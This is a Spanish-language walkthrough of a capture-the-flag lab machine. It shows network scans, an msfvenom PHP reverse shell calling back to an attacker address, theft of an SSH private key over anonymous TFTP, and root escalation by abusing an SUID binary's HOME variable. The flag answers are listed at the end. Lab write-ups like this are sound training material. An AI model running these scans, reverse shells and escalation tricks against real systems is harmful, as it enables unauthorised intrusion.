
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.28 -oN escaneo
msfvenom -p php/reverse_php LHOST=10.0.2.4 LPORT=443 -f raw -o pwned.php 
ftp 10.0.2.28
nmap -sU --top-ports 200 --min-rate=5000 -Pn 10.0.2.28
tftp 10.0.2.28
chmod 600 id_rsa
ssh alexia@10.0.2.28 -i id_rsa
```

Primero de todo buscamos la IP de la máquina realizando un arp-scan, una vez tenemos su IP realizamos un nmap para ver los puertos abiertos donde vemos que tiene los puertos 21, 22 y 80 abiertos.
![[Pasted image 20240310185557.png]]
Primero entraremos por el puerto 21 que tiene la vulnerabilidad de ftp anonymous.
```ftp
get index.html
```
![[Pasted image 20240310155507.png]]
Vemos que hay un archivo index.html lo que nos da a pensar que esta en el directorio de la web, así que ahora crearé una reverse shell con msfvenom y la subiré a la máquina pero al intentarlo no me deja, debido a que no hay mas ideas buscaré en los puertos udp.
![[Pasted image 20240310161531.png]]
Aquí vemos los servicios dhcpc y tftp
```tftp
get id_rsa
quit
```
En este servicio cogemos el id_rsa que mencionan en la web y nos logamos mediante ssh al usuario alexia consiguiendo su flag
![[Pasted image 20240310161900.png]]
```shell
cat user.txt
find / -perm -4000 2>/dev/null
cd /opt
./showMetheKey
strings showMetheKey 
export HOME=/root
./showMetheKey
```
Ahora buscamos binarios con permisos SUID y encontramos el binario showMetheKey
![[Pasted image 20240310162030.png]]
Lo ejecutamos y nos muestra un id_rsa del usuario alexia así que ejecutamos el comando strings y vemos que se ejecuta el comando cat haciendo uso de la variable HOME
![[Pasted image 20240310184309.png]]
Así que cambiamos el HOME a /root y ejecutamos el programa para obtener el id_rsa del usuario root.
![[Pasted image 20240310184242.png]]
Damos permisos a id_rsa2 y entramos por ssh como usuario root.
![[Pasted image 20240310184543.png]]
```shell
cat note.txt
find / -name 'root.txt'
cat /usr/include/root.txt
```
Finalmente ejecutamos un find y encontramos la flag de root
![[Pasted image 20240310184721.png]]
Flag de user: Imnotroot
Flad de root: Imnotbatman